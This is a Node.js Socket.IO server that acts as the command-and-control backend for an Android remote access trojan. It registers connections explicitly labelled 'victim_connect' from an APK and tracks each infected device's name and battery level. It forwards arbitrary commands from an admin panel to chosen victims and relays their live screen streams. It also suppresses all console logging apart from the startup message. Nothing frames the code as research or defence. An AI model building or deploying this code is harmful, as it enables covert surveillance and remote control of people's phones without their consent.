const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['polling', 'websocket']
});

// Store devices
const devices = new Map();
const deviceInfo = new Map();

// Serve panel directly
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Admin_panel.html'));
});

// Socket events
io.on('connection', (socket) => {
    // APK registers - QUICK CONNECTION
    socket.on('victim_connect', (data) => {
        devices.set(data.deviceId, socket.id);
        deviceInfo.set(data.deviceId, {
            deviceId: data.deviceId,
            deviceName: data.deviceName,
            battery: data.battery
        });
        broadcastDevices();
        
        // Quick connection acknowledge
        socket.emit('connection_ack', { 
            status: 'connected',
            deviceId: data.deviceId 
        });
    });

    // Panel commands
    socket.on('panel_command', (data) => {
        const targetSocket = devices.get(data.targetId);
        if (targetSocket) {
            io.to(targetSocket).emit(data.type, data.data);
        }
    });

    // Screen stream
    socket.on('live_screen', (data) => {
        socket.broadcast.emit('live_screen_update', data);
    });

    // Heartbeat
    socket.on('heartbeat', (data) => {
        if (deviceInfo.has(data.deviceId)) {
            deviceInfo.get(data.deviceId).battery = data.battery;
            broadcastDevices();
        }
    });

    socket.on('disconnect', () => {
        for (let [id, sockId] of devices.entries()) {
            if (sockId === socket.id) {
                devices.delete(id);
                deviceInfo.delete(id);
                broadcastDevices();
                break;
            }
        }
    });
});

function broadcastDevices() {
    const list = Array.from(deviceInfo.values());
    io.emit('devices_list', list);
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Server Running http://127.0.0.1:${PORT}`);
});

// Suppress all other console output except the URL
const originalLog = console.log;
console.log = function() {
    // Only show the server running message
    if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('Server Running')) {
        originalLog.apply(console, arguments);
    }
};
console.info = function() {};
console.warn = function() {};
console.error = function() {};